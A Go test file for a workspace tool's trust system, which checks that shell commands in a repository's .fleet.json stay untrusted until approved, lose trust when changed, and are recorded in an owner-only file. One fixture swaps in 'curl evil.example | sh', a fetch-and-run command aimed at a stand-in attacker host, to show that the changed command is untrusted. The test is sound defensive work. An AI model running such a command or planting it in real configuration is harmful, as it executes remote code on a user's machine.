package workspace

import (
	"os"
	"path/filepath"
	"testing"
)

func TestRepoShellCommandsAreUntrustedUntilTrusted(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	repo := t.TempDir()
	writeFile(t, repo, ".fleet.json", `{"workspace":{"create":"make ws"}}`)

	if CommandsTrusted(repo) {
		t.Fatal("commands were trusted before anyone trusted them")
	}
	if err := TrustCommands(repo); err != nil {
		t.Fatalf("TrustCommands: %v", err)
	}
	if !CommandsTrusted(repo) {
		t.Fatal("commands stayed untrusted after TrustCommands")
	}
}

func TestTrustIsLostWhenTheCommandsChange(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	repo := t.TempDir()
	writeFile(t, repo, ".fleet.json", `{"workspace":{"create":"make ws"}}`)
	if err := TrustCommands(repo); err != nil {
		t.Fatalf("TrustCommands: %v", err)
	}

	writeFile(t, repo, ".fleet.json", `{"workspace":{"create":"curl evil.example | sh"}}`)

	if CommandsTrusted(repo) {
		t.Fatal("changed commands inherited the trust given to the old ones")
	}
}

func TestRepoWithoutShellCommandsNeedsNoTrust(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	repo := t.TempDir()
	writeFile(t, repo, ".fleet.json", `{"pr_checks":{"ignore":["lint"]}}`)

	if !CommandsTrusted(repo) {
		t.Fatal("a repo with no shell commands was reported untrusted")
	}
}

func TestLinkedWorktreeSharesTrustWithItsMainCheckout(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	main := t.TempDir()
	linked := t.TempDir()
	linkWorktree(t, main, linked, "feature")
	config := `{"workspace":{"create":"make ws"}}`
	writeFile(t, main, ".fleet.json", config)
	writeFile(t, linked, ".fleet.json", config)

	if err := TrustCommands(main); err != nil {
		t.Fatalf("TrustCommands: %v", err)
	}

	if !CommandsTrusted(linked) {
		t.Fatal("a linked worktree with the same commands asked for trust again")
	}
}

func linkWorktree(t *testing.T, main, linked, name string) {
	t.Helper()
	gitDir := filepath.Join(main, ".git", "worktrees", name)
	if err := os.MkdirAll(gitDir, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFile(t, gitDir, "commondir", "../..\n")
	writeFile(t, linked, ".git", "gitdir: "+gitDir+"\n")
}

func TestTrustFileIsOwnerOnly(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	writeFile(t, repo, ".fleet.json", `{"workspace":{"create":"make ws"}}`)
	if err := TrustCommands(repo); err != nil {
		t.Fatalf("TrustCommands: %v", err)
	}

	info, err := os.Stat(filepath.Join(home, ".config", "fleet", "trusted_commands.json"))
	if err != nil {
		t.Fatal(err)
	}
	if got := info.Mode().Perm(); got != 0o600 {
		t.Fatalf("trust file mode = %o, want 600", got)
	}
}
